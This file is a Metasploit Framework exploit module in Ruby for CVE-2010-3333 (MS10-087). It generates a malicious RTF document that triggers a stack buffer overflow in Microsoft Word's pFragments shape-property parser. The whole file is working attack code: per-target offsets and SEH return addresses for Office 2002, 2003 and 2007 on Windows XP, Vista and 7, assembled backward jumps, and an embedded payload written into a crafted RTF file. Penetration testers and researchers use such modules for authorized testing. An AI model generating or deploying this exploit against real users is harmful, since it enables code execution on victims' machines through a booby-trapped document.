##
# $Id: ms10_087_rtf_pfragments_bof.rb 11875 2011-03-04 08:39:48Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word RTF pFragments Stack Buffer Overflow (File Format)',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the handling of the
				'pFragments' shape property within the Microsoft Word RTF parser. All versions
				of Microsoft Office 2010, 2007, 2003, and XP prior to the release of the
				MS10-087 bulletin are vulnerable.

				This module does not attempt to exploit the vulnerability via Microsoft Outlook.

				The Microsoft Word RTF parser was only used by default in versions of Microsoft
				Word itself prior to Office 2007. With the release of Office 2007, Microsoft
				began using the Word RTF parser, by default, to handle rich-text messages within
				Outlook as well. It was possible to configure Outlook 2003 and earlier to use
				the Microsoft Word engine too, but it was not a default setting.

				It appears as though Microsoft Office 2000 is not vulnerable. It is unlikely that
				Microsoft will confirm or deny this since Office 2000 has reached its support
				cycle end-of-life.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'wushi of team509',  # original discovery
					'unknown',           # exploit found in the wild
					'jduck',              # Metasploit module
					'DJ Manila Ice, Vesh, CA' # more office 2007 for the lulz
				],
			'Version'        => '$Revision: 11875 $',
			'References'     =>
				[
					[ 'CVE', '2010-3333' ],
					[ 'OSVDB', '69085' ],
					[ 'MSB', 'MS10-087' ],
					[ 'BID', '44652' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=880' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 512,
					'BadChars'      => "\x00",
					'DisableNops'   => true # no need
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# This automatic target will combine all targets into one file :)
					[ 'Automatic', { } ],

					# Office v10.6854.6845, winword.exe v10.0.6854.0
					[ 'Microsoft Office 2002 SP3 English on Windows XP SP3 English',
						{
							'Offsets' => [ 23532, 45944 ],
							#'Ret' => 0x30002491 # p/p/r in winword.exe v10.0.6854.0
							'Ret' => 0x30002309 # p/p/r in winword.exe v10.0.6866.0
						}
					],

					# Office v11.8307.8324, winword.exe v11.0.8307.0
					# Office v11.8328.8221, winword.exe v11.0.8328.0
					[ 'Microsoft Office 2003 SP3 English on Windows XP SP3 English',
						{
							'Offsets' => [ 24580, 51156 ],
							'Ret' => 0x30001bdd # p/p/r in winword.exe
						}
					],

					# In order to exploit this bug on Office 2007, a SafeSEH bypass method is needed.

					# Office v12.0.6425.1000, winword.exe v12.0.6425.1000
					[ 'Microsoft Office 2007 SP0 English on Windows XP SP3 English',
						{
							'Offsets' => [ 5956 ],
							'Ret' => 0x00290b0b # call ptr to ebp + 30, hits the next record
						}
					],

					[ 'Microsoft Office 2007 SP0 English on Windows Vista SP0 English',
						{
							'Offsets' => [ 5956 ],
							'Ret' => 0x78812890 # p/p/r in msxml5.dll which wasn't opted into SafeSEH.  say word.
						}
					],

					[ 'Microsoft Office 2007 SP0 English on Windows 7 SP0 English',
						{
							'Offsets' => [ 5956 ],
							'Ret' => 0x78812890 # p/p/r in msxml5.dll which wasn't opted into SafeSEH.  say word.
						}
					],


					# crash on a deref path to heaven.
					[ 'Crash Target for Debugging',
						{
							'Offsets' => [ 65535 ],
							'Ret' => 0xdac0ffee
						}
					]
				],
			'DisclosureDate' => 'Nov 09 2010',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.rtf']),
			], self.class)
	end

	def add_target(rest, targ)
		targ['Offsets'].each { |off|
			seh = generate_seh_record(targ.ret)
			rest[off, seh.length] = seh
			distance = off + seh.length
			jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
			rest[off + seh.length, jmp_back.length] = jmp_back
		}
	end

	def exploit

		# Prepare a sample SEH frame and backward jmp for length calculations
		seh = generate_seh_record(0xdeadbeef)
		jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-0xffff").encode_string

		# RTF property Array parameters
		el_size = sz_rand()
		el_count = sz_rand()

		data = ''
		# These words are presumably incorrectly used
		# assert(amount1 <= amount2)
		data << [0x1111].pack('v') * 2
		data << [0xc8ac].pack('v')

		# Filler
		if target.name =~ /Debug/i
			rest = Rex::Text.pattern_create(0x10000 + seh.length + jmp_back.length)
		else
			len = 51200 + rand(1000)
			rest = rand_text(len + seh.length + jmp_back.length)
			rest[0, payload.encoded.length] = payload.encoded
		end

		# Stick fake SEH frames here and there ;)
		if target.name == "Automatic"
			targets.each { |t|
				next if t.name !~ /Windows/i

				add_target(rest, t)
			}
		else
			add_target(rest, target)
		end

		# Craft the array for the property value
		sploit = "%d;%d;" % [el_size, el_count]
		sploit << data.unpack('H*').first
		sploit << rest.unpack('H*').first

		# Assemble it all into a nice RTF
		content  = "{\\rtf1"
		content << "{\\shp"             # shape
		content << "{\\sp"              # shape property
		content << "{\\sn pFragments}"  # property name
		content << "{\\sv #{sploit}}"   # property value
		content << "}"
		content << "}"
		content << "}"

		print_status("Creating '#{datastore['FILENAME']}' file ...")
		file_create(content)

	end

	def sz_rand
		bad_sizes = [ 0, 2, 4, 8 ]
		x = rand(9)
		while bad_sizes.include? x
			x = rand(9)
		end
		x
	end
end
